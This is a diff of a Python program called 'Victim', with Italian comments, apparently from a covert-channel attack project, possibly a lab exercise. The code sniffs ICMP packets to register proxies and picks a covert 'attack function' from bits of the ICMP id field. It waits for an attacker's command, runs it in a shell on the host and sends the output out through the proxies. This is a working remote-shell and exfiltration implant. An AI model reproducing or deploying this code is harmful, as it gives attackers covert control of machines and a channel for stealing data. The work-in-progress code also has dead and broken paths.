@@ -9,6 +9,7 @@ import threading
 import sys
 import select  
 import ipaddress
+import time
 
 file_path = "../comunication_methods.py"
 directory = os.path.dirname(file_path)
@@ -25,19 +26,25 @@ directory = os.path.dirname(file_path)
 sys.path.insert(0, directory)
 import type_singleton as singleton
 
+file_path = "./attacksingleton.py"
+directory = os.path.dirname(file_path)
+sys.path.insert(0, directory)
+import attacksingleton 
+
 #---------------------
-def send_lastpacket_toall_proxies(proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=None):
+def send_lastpacket_toall_proxies(attack_function:str, proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=None):
     try:
-        com.is_list(proxy_list)
+        if not com.is_string(attack_function) or not com.is_list(proxy_list): 
+            raise Exception("Argomenti non corretti") 
     except Exception as e:
         raise Exception(f"send_lastpacket_toall_proxies: {e}")
     print(f"aggiorniamo i proxy; questo è l'ultimo pacchetto")
     unavailable_proxy=[]
     for proxy in proxy_list: 
-        data=(com.LAST_PACKET).encode()
-        ans=com.send_packet(data, proxy, icmp_seq=0)
-        if not ans:
-            unavailable_proxy.append(proxy)
+        data=(com.LAST_PACKET).encode() 
+        attacksingleton.send_data(attack_function, data, proxy) 
+        #if not attacksingleton.send_data(attack_function, data, proxy): 
+        #    unavailable_proxy.append(proxy) 
     return unavailable_proxy
 
 def choose_proxy(proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=None):
@@ -50,11 +57,13 @@ def choose_proxy(proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=No
     return random.choice(proxy_list) 
 
 def get_data_from_command(process_shell):
+    count=0
     print(f"Did command failed? {process_shell.poll() is not None}") 
     data=[]
     there_is_smth_to_read=True
     while there_is_smth_to_read: 
-        print("lettura dei dati...")
+        count+=1
+        print(f"lettura dei dati... {count}")
         reads = [process_shell.stderr.fileno(),process_shell.stdout.fileno()] 
         ret = select.select(reads, [], [], 1.0)  # 1s timeout for safety 
         for fd in ret[0]:
@@ -67,6 +76,7 @@ def get_data_from_command(process_shell):
                     if com.END_DATA.strip() in stripped_data:
                         print(f"No more lines to read")
                         there_is_smth_to_read = False
+                        break
                 else:
                     print(f"stdout EOF {output_line}") 
                     there_is_smth_to_read = False
@@ -76,9 +86,12 @@ def get_data_from_command(process_shell):
                     stripped_data=error_line.strip()
                     data.append(stripped_data)
                     print("stderr:", stripped_data) 
+                    there_is_smth_to_read = False  
+                    break
                 else:
                     print(f"stderr EOF {output_line}") 
                     there_is_smth_to_read = False  
+                    break
         # Optional: check if process exited early
         #if process_shell.poll() is not None and there_is_smth_to_read:
             #print("Process exited but streams may still have data")
@@ -91,36 +104,9 @@ def check_system_compatibility():
         return False
     return True 
 
-def execute_command(command): 
-        try:
-            if com.is_bytes(command):
-                command=command.decode()
-        except Exception as e: 
-            try:
-                if not com.is_string(command):
-                    command=str(command) 
-            except Exception as e:
-                raise Exception(f"execute_command: {e}")
-        try:
-            if not check_system_compatibility(): 
-                raise Exception(f"execute_command: {sys.platform} non supportato...")
-        except Exception as e:
-            raise Exception(f"execute_command: {e}")
-        print("Sistema supportato...")
-        try:
-            process_shell=mymethods.getShellProcess()
-            com.is_valid_shell(process_shell)
-            print("Shell aperta con successo...")
-        except Exception as e:
-            raise Exception(f"execute_command: {e}")
-        try:
-            print(f"Esecuzione del comando {command}")
-            process_shell.stdin.write(f"{command.replace('\n','' '')}; echo {com.END_DATA}\n")
-            process_shell.stdin.flush() 
-            print(f"comando eseguito...") 
-            return process_shell 
-        except Exception as e:
-            raise Exception(f"execute_command: {e}") 
+
+
+         
 
 def callback_wait_for_command(connected_proxy:list, event_pktconn:threading.Event, comando:list): 
     def callback(packet):
@@ -146,6 +132,68 @@ def callback_wait_for_command(connected_proxy:list, event_pktconn:threading.Even
                 return
     return callback
     
+def wait_attacker_command(attack_function:dict, ip_host:ipaddress.IPv4Address, command:list): 
+        print(f"Waiting data by attack function: {attack_function}")
+        if attacksingleton.wait_data(next(iter(attack_function.items()))[0], ip_host, command):
+            print(f"Finished waiting data. Comando ricevuto: {command}") 
+            if len(command)==1:
+                command=command[0].replace(com.CONFIRM_COMMAND,"")
+            elif len(command)>1:
+                print(f"Errore multipli comandi: {command}")
+                command=command[0]
+            elif len(command)<1: 
+                print(f"Errore nessun comando: {command}")
+                command=com.END_COMMUNICATION
+        else: print("Comando non ricevuto") 
+
+def send_data_to_proxies(data_to_send:list, connected_proxy:list[ipaddress.IPv4Address], attack_function:dict): 
+        print("AAA data_to_send: ",data_to_send) 
+        if not com.is_list(data_to_send) or len(data_to_send)<=0:
+            raise ValueError(f"send_data_to_proxies: Lista nessun dato presente {data_to_send}") 
+        chosen_proxy=choose_proxy(connected_proxy) 
+        print(f"Il proxy scelto è {chosen_proxy}") 
+        #print("I dati che verranno mandati a", chosen_proxy," sono: ",data_to_send) 
+        data_has_being_sent=False
+        sequenza=0
+        for data in data_to_send:
+            print("Sending data: ",data) 
+            if com.END_DATA in data: 
+                try: 
+                    unavailable_proxy=send_lastpacket_toall_proxies(next(iter(attack_function.items()))[0], connected_proxy)  
+                    print(f"Proxy che non hanno ricevuto l'aggiornamento {unavailable_proxy}")
+                    #for proxy in unavailable_proxy:
+                    #    connected_proxy.remove(proxy)
+                    print(f"Proxy che hanno ricevuto l'aggiornamento {connected_proxy}")
+                except Exception as e:
+                    raise Exception(f"send_data_to_proxies: {e}")
+                break
+            data=data if isinstance(data,bytes) else data.encode() 
+            print("send_data_to_proxies Attack function: ",next(iter(attack_function.items()))[0])
+            print(f"Sending to proxy: {data}")
+            data_has_being_sent=attacksingleton.send_data(next(iter(attack_function.items()))[0], data, chosen_proxy) 
+            #print("data_has_being_sent: ",data_has_being_sent)
+            continue
+            #data_has_being_sent=com.send_packet(
+            #     data
+            #    ,chosen_proxy
+            #    ,icmp_seq=sequenza
+            #) 
+            if not data_has_being_sent:
+                print(f"{chosen_proxy} non ha ricevuto i dati") 
+                connected_proxy.remove(chosen_proxy)
+                for proxy in connected_proxy.copy():
+                    print(f"proviamo il proxy {proxy}")
+                    #if com.send_packet( data,proxy,icmp_seq=sequenza): 
+                    if attacksingleton.send_data(next(iter(attack_function.items()))[0], data, chosen_proxy):
+                        chosen_proxy=proxy 
+                        print(f"scelto il nuovo proxy {chosen_proxy}")
+                        break
+                    connected_proxy.remove(proxy) 
+                    print(f"rimosso il proxy {proxy}")
+            else:
+                print(f"{chosen_proxy} ha ricevuto i dati")
+            sequenza+=1
+
 
 #-------------------------------------
 def ask_to_continue(msg:str="PLACEHOLDER MESSAGE [si/no]"):
@@ -222,8 +270,9 @@ def is_proxy_already_connected(proxy:ipaddress.IPv4Address|ipaddress.IPv6Address
     lock_connected_proxy.release() 
     return is_already_connected 
 
-def callback_wait_conn_from_proxy(connected_proxy:list, ip_host:ipaddress.IPv4Address|ipaddress.IPv6Address, event_enough_proxy:threading.Event, lock_connected_proxy:threading.Lock, num_proxy:int): 
+def callback_wait_conn_from_proxy(connected_proxy:list, ip_host:ipaddress.IPv4Address|ipaddress.IPv6Address, event_enough_proxy:threading.Event, lock_connected_proxy:threading.Lock, num_proxy:int, attack_function:dict): 
     def callback(packet):
+        nonlocal attack_function, connected_proxy, ip_host, event_enough_proxy, lock_connected_proxy, num_proxy
         print(f"callback wait_conn_from_proxy received:\n\t{packet.summary()}") 
         if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
             print(f"Ricevuto pacchetto da {packet[IP].src}...")
@@ -232,9 +281,13 @@ def callback_wait_conn_from_proxy(connected_proxy:list, ip_host:ipaddress.IPv4Ad
                 print(f"already connected with {ip_src}:\n\t{connected_proxy}")
                 return
             confirm_text=(com.CONFIRM_PROXY+ip_host.compressed).encode()
-            checksum=mymethods.calc_checksum(confirm_text) 
-            if confirm_text in packet[Raw].load and checksum==packet[ICMP].id: 
+            #checksum=mymethods.calc_checksum(confirm_text)   
+
+            if confirm_text in packet[Raw].load : #and checksum==packet[ICMP].id
                 #confirm_conn_to_proxy
+                int_version=packet[ICMP].id>>8 ^ int.from_bytes("i".encode())
+                int_code=packet[ICMP].id & 0xFF ^ int.from_bytes("p".encode())   
+                attack_function.update(attacksingleton.AttackType().get_attack_function("ipv"+chr(int_version)+"_"+chr(int_code)))
                 data=(com.CONFIRM_VICTIM+ip_host.compressed+ip_src.compressed).encode()
                 if com.send_packet(data,ip_src): 
                     add_proxy_to_connected_list(
@@ -280,18 +333,25 @@ def get_args_from_parser():
 WAITING_TIME=20
 class Victim:
     def define_variables(self): 
-            ip_host, errore=mymethods.find_local_IP()
-            ip_host="192.168.56.102" #TOD delete after
-            if ip_host is None: 
-                raise Exception(f"Coulnd't get ip: {errore}")
-            self.ip_host=ipaddress.ip_address(ip_host)
-            if not isinstance(args:=get_args_from_parser(),argparse.Namespace): 
-                raise ValueError("args non è istanza di argparse.Namespace") 
-            dict_values={
-                "num_proxy":args.num_proxy  
-            }
-            self.num_proxy=dict_values.get("num_proxy")
-            print(f"num_proxy: {type(self.num_proxy)} {self.num_proxy}")
+        while True:
+            try:
+                self.ip_host, errore=mymethods.find_local_IP()
+                if self.ip_host is None: 
+                    msg="Inserire indirizzo IP dell'host:\t" 
+                    #self.ip_host=ipaddress.ip_address(input(msg)) #"192.168.56.102"
+                    self.ip_host=ipaddress.ip_address("192.168.56.102") 
+                    break
+                #else: raise Exception(f"Coulnd't get ip: {errore}") 
+            except Exception as e:
+                print(f"define_varuiables: {e}")
+        print("IP host: ",type(self.ip_host),self.ip_host)
+        if not isinstance(args:=get_args_from_parser(),argparse.Namespace): 
+            raise ValueError("args non è istanza di argparse.Namespace") 
+        dict_values={
+            "num_proxy":args.num_proxy  
+        }
+        self.num_proxy=dict_values.get("num_proxy")
+        print(f"num_proxy: {type(self.num_proxy)} {self.num_proxy}")
     
     def proxy_connection(self): 
             self.connected_proxy:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]
@@ -305,37 +365,62 @@ class Victim:
                     exit(0)
                 else:
                     print("Continuo con i proxy trovati...") 
+            print("attack_function: ",self.attack_function)
 
     def __init__(self):
         try: 
-            self.define_variables()
+            self.define_variables() 
+            self.attack_function={}
         except Exception as e:
-            print(f"define_variables: {e}")
+            print(f"__init__ var: {e}")
             exit(1) 
         try: 
             self.proxy_connection()
         except Exception as e:
-            print(f"Eccezione: {e}")
+            print(f"__init__ proxy conn: {e}")
             exit(1) 
-        
+        try: 
+            self.wait_command_send_data()
+        except Exception as e:
+            print(f"__init__ proxy conn: {e}")
+            exit(1) 
+    
+    def wait_command_send_data(self):
         try:
-            #wait_command_send_data
-            self.wait_attacker_command()  
-            process_shell=None
+            self.command:list[str]=[]
+            print(f"In attesa del comando: {self.command}")
+            wait_attacker_command(self.attack_function, self.ip_host, self.command) 
+            if not check_system_compatibility(): 
+                raise Exception(f"{sys.platform} non supportato...") 
+            print("Sistema supportato...")
+            self.process_shell=mymethods.getShellProcess()
+            if com.is_valid_shell(self.process_shell):
+                print("Shell aperta con successo...") 
+            else: raise Exception(f"Shell non valida {self.process_shell}")
+            data_sent_event=com.get_threading_Event()
             while self.command and com.END_COMMUNICATION not in self.command and self.command not in com.exit_cases:
-                try: 
-                    process_shell=execute_command(self.command)
-                    com.is_valid_shell(process_shell) 
-                    data=get_data_from_command(process_shell) 
-                    self.send_data_to_proxies(data) 
-                    self.wait_attacker_command()
+                try:  
+                    #execute_command(self.command[0], self.process_shell)
+                    try:
+                        print(f"Esecuzione del comando {self.command[0].replace('\n','')}; echo {com.END_DATA}")
+                        self.process_shell.stdin.write(f"{self.command[0].replace('\n','')}; echo {com.END_DATA}\n")
+                        self.process_shell.stdin.flush() 
+                        print(f"Comando eseguito...") 
+                    except Exception as e:
+                        raise Exception(f"execute_command exec: {e}")
+                    data=get_data_from_command(self.process_shell)  
+                    print("Data got from execution: ",data)   
+                    send_data_to_proxies(data, self.connected_proxy, self.attack_function) 
+                    print("Waiting for another command")  
+                    wait_attacker_command(self.attack_function, self.ip_host, self.command)
+                    break
                 except Exception as e:
                     print(f"wait_command_send_data: {e}")
             print("Fine del programma")
             try:
-                if process_shell is not None and com.is_valid_shell(process_shell):
-                    process_shell.wait()  # Attende la chiusura del processo
-                    process_shell.terminate()  # Termina il processo 
+                if self.process_shell is not None and com.is_valid_shell(self.process_shell):
+                    self.process_shell.wait()  # Attende la chiusura del processo
+                    self.process_shell.terminate()  # Termina il processo 
             except Exception as e:
                 raise Exception(f"wait_command_send_data: {e}") 
         except Exception as e:
@@ -344,17 +429,16 @@ class Victim:
 
     def wait_conn_from_proxy(self): 
         try:
-            confirm_text=com.CONFIRM_PROXY+self.ip_host.compressed
-            checksum=mymethods.calc_checksum(confirm_text.encode())
-            self.event_enough_proxy=com.get_threading_Event() 
-            interface=mymethods.default_iface()
-            filter=singleton.AttackType().get_filter_connection_from_function(
-                "victim_wait_conn_from_proxy"
-                ,checksum=checksum
+            #confirm_text=com.CONFIRM_PROXY+self.ip_host.compressed
+            #checksum=mymethods.calc_checksum(confirm_text.encode()) 
+            self.event_enough_proxy=com.get_threading_Event()  
+            interface=mymethods.default_iface()  
+            filter=attacksingleton.get_filter_connection_from_function(
+                "victim_wait_conn_from_proxy" 
                 ,ip_dst=self.ip_host
-            ) 
+            )  
         except Exception as e:
-            print(f"wait_conn_from_proxy: {e}") 
+            print(f"wait_conn_from_proxy filter: {e}") 
             return
 
         args={
@@ -366,6 +450,7 @@ class Victim:
                 ,self.event_enough_proxy
                 ,self.lock_connected_proxy
                 ,self.num_proxy
+                ,self.attack_function
             )
             #,"store":True 
             ,"iface":interface
@@ -385,17 +470,20 @@ class Victim:
             self.sniffer,self.enough_proxy_timer=com.sniff_packet_w_callbak(
                 args,WAITING_TIME,callback_function_timer
             )
-            com.wait_threading_Event(self.event_enough_proxy)  
+            com.wait_threading_Event(self.event_enough_proxy)   
         except Exception as e:
             print(f"wait_conn_from_proxy sniffing data: {e}",file=sys.stderr)  
-        try:   
-            com.stop_sinffer(self.sniffer)
+        try: 
+            com.stop_sinffer(self.sniffer) 
             com.stop_timer(self.enough_proxy_timer) 
+            print(f"Funzione di attacco ricevuta: {self.attack_function}")
         except Exception as e:
             print(f"wait_conn_from_proxy closing connection: {e}",file=sys.stderr)  
         print(f"I proxy utilzzabili sono {len(self.connected_proxy)}: {self.connected_proxy}") 
+    
+    
             
-    def wait_attacker_command(self): 
+    def old_wait_attacker_command(self): 
         self.command=[]
         print("Waiting for a command...") 
         filter=singleton.AttackType().get_filter_connection_from_function(
@@ -438,50 +526,7 @@ class Victim:
         com.stop_sinffer(self.sniffer)
         com.stop_timer(self.timeout_timer)  
 
-    def send_data_to_proxies(self,data_to_send:list=None):
-        try: 
-            if not com.is_list(data_to_send) or len(data_to_send)<=0:
-                raise ValueError(f"send_data_to_proxies: nessun dato presente {data_to_send}")
-        except Exception as e:
-            raise ValueError(f"send_data_to_proxies: {e}")  
-        chosen_proxy=choose_proxy(self.connected_proxy) 
-        print(f"Il proxy scelto è {chosen_proxy}") 
-        #print("I dati che verranno mandati a", chosen_proxy," sono: ",data_to_send) 
-        data_has_being_sent=False
-        sequenza=0
-        for data in data_to_send:
-            if com.END_DATA in data:
-                print(f"data={data}")
-                try: 
-                    unavailable_proxy=send_lastpacket_toall_proxies(self.connected_proxy)  
-                    print(f"Proxy che non hanno ricevuto l'aggiornamento {unavailable_proxy}")
-                    for proxy in unavailable_proxy:
-                        self.connected_proxy.remove(proxy)
-                    print(f"Proxy che hanno ricevuto l'aggiornamento {self.connected_proxy}")
-                except Exception as e:
-                    raise Exception(f"send_data_to_proxies: {e}")
-                break
-            data=data if isinstance(data,bytes) else data.encode()
-            print(f"PROVA {data}")
-            data_has_being_sent=com.send_packet(
-                 data
-                ,chosen_proxy
-                ,icmp_seq=sequenza
-            ) 
-            if not data_has_being_sent:
-                print(f"{chosen_proxy} non ha ricevuto i dati") 
-                self.connected_proxy.remove(chosen_proxy)
-                for proxy in self.connected_proxy.copy():
-                    print(f"proviamo il proxy {proxy}")
-                    if com.send_packet( data,proxy,icmp_seq=sequenza): 
-                        chosen_proxy=proxy 
-                        print(f"scelto il nuovo proxy {chosen_proxy}")
-                        break
-                    self.connected_proxy.remove(proxy) 
-                    print(f"rimosso il proxy {proxy}")
-            else:
-                print(f"{chosen_proxy} ha ricevuto i dati")
-            sequenza+=1
+    
 
 if __name__ == "__main__": 
     Victim()   
